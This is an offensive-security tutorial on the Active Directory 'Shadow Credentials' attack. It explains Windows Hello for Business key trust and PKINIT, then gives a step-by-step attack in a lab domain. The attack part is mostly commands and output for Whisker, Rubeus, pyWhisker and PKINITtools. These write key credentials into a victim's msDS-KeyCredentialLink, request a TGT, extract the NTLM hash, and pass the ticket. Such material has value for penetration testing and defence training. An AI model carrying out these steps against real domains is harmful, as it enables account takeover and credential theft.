## What is?
It is an alternative kind of attack that abuses **Windows Hello for Business** functionality for password less authentication. It works by adding `Key Credentials` to the `msDS-KeyCredentialLink` attribute of the target user/computer account and then performing Kerberos authentication as that account using PKINIT.


## How does Windows Hello works?
The client's public key is stored in the multi-value attribute, `msDS-KeyCredentialLink`. This attribute's values are Key Credentials, serialized objects containing information such as the creation date, the distinguished name of the owner, a GUID that represents a Device ID, and, of course, the public key. It is a multi-value attribute because an account has several linked devices.
The private key is stored in the TPM and never leaves it. Suppose the organization has implemented the Certificate Trust model. In that case, the client issues a certificate request to obtain a trusted certificate from the environment’s certificate issuing authority for the TPM-generated key pair. On the other hand, if the Key Trust model is implemented, the public key is stored in a new Key Credential object in the `msDS-KeyCredentialLink` attribute of the account. The private key is protected by a PIN code, which can be replaced with a biometric authentication factor like fingerprint or face recognition, thanks to Windows Hello.
Windows attempts to perform PKINIT authentication using their private key when a client logs in. Under the Key Trust model, the Domain Controller can decrypt their pre-authentication data using the raw public key in the corresponding object stored in the client’s `msDS-KeyCredentialLink` attribute.


## Good to know
The PKINIT protocol is a security protocol that authenticates entities on a network using public key cryptography. PKINIT is a `pre-authentication` extension that extends the Kerberos Protocol to use public key cryptography and ticket-granting ticket (TGT) data signing during the initial AS exchange. It's specified in [RFC4556], but Microsoft has made some modifications for Windows implementation of PKINIT that differs from [[RFC4556]](https://datatracker.ietf.org/doc/html/rfc4556) which can be found in [[MS-PKCA]: Public Key Cryptography for Initial Authentication (PKINIT) in Kerberos Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b).


## Requisites
In order to be able to perform a Shadow Credentials type of attack you need to fulfill the following steps.
- Your account must be able to write the attribute  `msDS-KeyCredentialLink` of a victim computer object.
- The target domain must have at least a *Windows Server 2016* and a AD with minimum level of *2016 or above*.
- The organization must have AD CS, PKI, CA, or something similar. If not met, a `KRB-ERROR (16): KDC_ERR_PADATA_TYPE_NOSUPP` will be raised.


## How to identify?
You can use Bloodhound, Powerview.ps1 or similar. In Bloodhound you want to look for *AddKeyCredentialLink* permission to write the `msDS-KeyCredentialLink` attribute or *GenericWrite*, *GenericAll*.
In Powerview.ps1(or similar) you want to look for *GenericWrite*, *GenericAll* or *WriteProperty* over the target's `msDS-KeyCredentialLink` attribute.


# Attack
You can perform the same attack both from Windows and Linux.
## Windows friendly
You can start by reading the attribute( `msDS-KeyCredentialLink`) from you controlled user with Whisker.exe(https://github.com/eladshamir/Whisker).
```powershell-session
.\Whisker.exe list /target:gabriel
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Listing deviced for gabriel:
    DeviceID: 462d7a93-f342-a139-96fc-2c750d2f4c89 | Creation Time: 27/04/2024 18:01:17
```
Now we can inject new credentials into the attribute.
```powershell-session
.\Whisker.exe add /target:gabriel
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password cw7I7QaHMS44q5xt
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 48d97546-cac9-4e92-981b-e89da231f7a8
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show
```
Now can we use Rubeus.exe to get a valid TGT and NTML hash that can be used(copy the command received from the previous session).
```powershell-session
.\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap
  ______    _
 (_____ \   | |
  _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/

 v2.3.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=gabriel
[*] Building AS-REQ (w/ PKINIT preauth) for: 'lab.local\gabriel'
[*] Using domain controller: fe80::f11e:5faf:4886:146a%15:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

   doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...

[*] Getting credentials using U2U

 CredentialInfo    :
  Version       : 0
  EncryptionType   : rc4_hmac
  CredentialData   :
   CredentialCount  : 1
    NTLM       : 2D1DA879CA71003...SNIP...
```
Here we can either PTH(Pass the hash) or inject the **kirbi** ticket into same session by creating a "sacrificial session".
```powershell-session
.\Rubeus.exe createnetonly /program:powershell.exe /show
```
And injecting the ticket into the "sacrificial session".
```powershell-session
.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
```
When done, cleanup the attribute(match with the appropriate ID).
```powershell-session
.\Whisker.exe remove /target:gabriel /deviceid:48d97546-cac9-4e92-981b-e89da231f7a8
```

## Linux friendly
In Linux you will write the attribute by using the python implementation named  pyWhisker(https://github.com/ShutdownRepo/pywhisker).
```shell-session
python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add
[*] Searching for the target account
[*] Target user found: CN=Gabriel,CN=Users,DC=lab,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a37a618e-ac85-4053-3519-12bf69744e5b
[*] Updating the msDS-KeyCredentialLink attribute of gabriel
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: BX4EWk8m.pfx
[*] Must be used with password: KQAx5lHP3h9TtzNly2Us
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
Now we need to use another tool from the PKINITSuite(https://github.com/dirkjanm/PKINITtools) to grab a TGT from the *pfx* certificate obtained before.
```shell-session
python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache
2024-02-15 12:53:15,655 minikerberos INFO  Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-02-15 12:53:15,667 minikerberos INFO  Requesting TGT
INFO:minikerberos:Requesting TGT
2024-02-15 12:53:15,954 minikerberos INFO  AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-02-15 12:53:15,954 minikerberos INFO  46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a
INFO:minikerberos:46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a
2024-02-15 12:53:15,956 minikerberos INFO  Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
Now we can point to the ccache Kerberos ticket and obtain a valid NTLM hash for the victim as well(*EXTRA*).
```shell-session
export KRB5CCNAME=gabriel.ccache 
python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel 
```
Again, when done please cleanup!
```shell-session
python3 pywhisker.py --dc-ip 10.129.228.236 -d lab.local -u jeffry -p Music001 --target Monic --action remove -D b764318a-b5cb-304f-b0e0-f220230fcd79
```